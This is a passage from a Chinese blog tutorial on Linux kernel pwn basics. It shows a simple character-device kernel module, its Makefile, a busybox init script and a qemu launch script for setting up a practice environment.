class="title">cdev</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">hello_fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* hello_init函数是模块初始化函数，他会在内核模块被加载的时候执行，使用__init进行修饰，一般用它来初始化数据结构等内容； */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = MKDEV(hello_major, hello_minor);</span><br><span class="line">    <span class="keyword">if</span> (hello_major)</span><br><span class="line">        ret = register_chrdev_region(devno, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = alloc_chrdev_region(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">        hello_major = MAJOR(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">    hello_devp = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> hello_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!hello_devp) &#123;</span><br><span class="line">        unregister_chrdev_region(devno, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;hello_devp-&gt;cdev, &amp;hello_fops);</span><br><span class="line">    hello_devp-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="type">int</span> err = (<span class="type">int</span>) cdev_add(&amp;hello_devp-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) printk(<span class="string">&quot;[-] Error %d adding myko %d\n&quot;</span>, err, hello_minor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* 函数module_init()和clearnup_exit()是模块编程中最基本也是必须得两个函数，它用来指定模块加载和退出时调用的函数，</span></span><br><span class="line"><span class="comment">* 这里加载的是我们定义好的两个函数，module_init()向内核注册模块提供新功能，而cleanup_exit()注销由模块提供的所用功能。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">module_init(hello_init);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* hello_exit函数是模块的退出函数，他会在模块在退出的时候执行。 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    cdev_del(&amp;hello_devp-&gt;cdev);</span><br><span class="line">    kfree(hello_devp);</span><br><span class="line">    unregister_chrdev_region(MKDEV(hello_major, hello_minor), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">    filp-&gt;private_data = hello_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        printk(<span class="string">&quot;[-] No device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, <span class="keyword">sizeof</span>(dev-&gt;mem));</span><br><span class="line">            printk(<span class="string">&quot;[+] Clear success\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printk(<span class="string">&quot;[-] Error command\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buf, dev-&gt;mem + *pos, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    printk(<span class="string">&quot;[+] Read %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(dev-&gt;mem + *pos, buf, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    printk(<span class="string">&quot;[+] Written %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">0</span> &amp;&amp; op != <span class="number">1</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) offset += filp-&gt;f_pos;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; MAX_SIZE) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> filp-&gt;f_pos = offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>makefile</strong></p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">obj-m := ko_test.o</span><br><span class="line"></span><br><span class="line">KERNELDR :=/home/kl/linux-5.4.98</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>

<p>make 之后，将 <code>ko_test.ko</code> 文件打包进 busybox 文件系统中，并创建文件夹 <code>mkdir -p lib tmp proc sys dev etc/init.d</code>。然后创建启动脚本并赋予其可执行权限。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /lib/ko_test.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure></div>

<p>之后在busybox 根目录运行命令 <code>find . | cpio -o -H newc &gt; ../rootfs.img </code>。将编译好的<code>/kernel/arch/x86/boot/bzImage</code>复制到rootfs.img 同级目录。</p>
<p>启动 qemu。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/image-20240201192628878.png"
                      alt="image-20240201192628878"
                ></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> 深入理解Pwn_Kernel基础篇</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2025-12-15 14:36:16</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2026-01-19 13:40:38
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2025/12/15/深入理解Pwn_Kernel基础篇/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Pwn-Kernel/">#Pwn_Kernel</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/12/23/Rust%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Rust操作系统开发</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/09/29/LibSFNet%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">LibSFNet开发手记</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">深入理解Pwn_Kernel基础篇</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%AE%80%E4%BB%8B"><span class="nav-text">内核简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ring-Model"><span class="nav-text">Ring Model</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Loadable-Kernel-Modules-LKMs"><span class="nav-text">Loadable Kernel Modules(LKMs)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="nav-text">相关指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%80%81-%E5%86%85%E6%A0%B8%E6%80%81"><span class="nav-text">用户态-&gt;内核态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%80%81-%E7%94%A8%E6%88%B7%E6%80%81"><span class="nav-text">内核态-&gt;用户态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%80%81%E5%87%BD%E6%95%B0"><span class="nav-text">内核态函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E4%BF%9D%E6%8A%A4"><span class="nav-text">内核保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E9%97%B4%E7%9B%B8%E5%85%B3"><span class="nav-text">空间相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3"><span class="nav-text">地址相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3"><span class="nav-text">信息相关</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3"><span class="nav-text">数据相关</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-text">Linux 内核内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98"><span class="nav-text">物理内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%9E%B6%E6%9E%84"><span class="nav-text">内存架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B"><span class="nav-text">内存模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A0%88"><span class="nav-text">内核栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A0%86"><span class="nav-text">内核堆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%91%E6%A0%B8"><span class="nav-text">绑核</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">进程权限管理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">权限保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AE%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">段保护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">页保护机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8Bcred%E6%8C%87%E9%92%88%E5%AE%9A%E4%BD%8D"><span class="nav-text">进程cred指针定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commit-creds-prepare-kernel-cred-0"><span class="nav-text">commit_creds(prepare_kernel_cred(0))</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commit-creds-init-cred"><span class="nav-text">commit_creds(&amp;init_cred)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5"><span class="nav-text">符号链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-usermodehelper"><span class="nav-text">call_usermodehelper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A9%E6%9C%9F%E7%9A%84%E5%86%85%E6%A0%B8"><span class="nav-text">早期的内核</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ioctl-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">ioctl 系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91-%E5%8F%AF%E9%80%89"><span class="nav-text">内核编译 (可选)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-busybox-%E5%8F%AF%E9%80%89"><span class="nav-text">编译 busybox (可选)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel-Pwn-%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B"><span class="nav-text">Kernel Pwn 一般流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91"><span class="nav-text">内核模块开发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%A9%B1%E5%8A%A8%E8%AE%BE%E5%A4%87"><span class="nav-text">字符驱动设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99"><span class="nav-text">内核模块编写</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2026&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        171 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


